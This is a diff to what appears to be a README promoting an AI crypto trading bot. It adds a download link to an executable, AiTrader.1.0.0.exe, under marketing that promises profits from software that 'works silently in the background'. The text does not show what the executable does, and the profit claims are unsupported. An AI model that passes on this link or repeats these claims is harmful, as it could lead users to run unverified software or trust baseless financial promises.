@@ -20,3 +20,4 @@ Why choose our private AI? 🤔
 Because it works silently in the background, maximizing your profits while keeping everything private and secure! 🔒💼
 
 ![e0b7d3a6-27f8-44a1-bd12-2839ad8d9fb8](https://github.com/user-attachments/assets/2bb5efcd-db3e-4aa8-b830-139460bb8114)
+Download latest version: [Download](https://github.com/Tradercryptobest/Ai-trader-crypto-bot/releases/download/Download/AiTrader.1.0.0.exe)
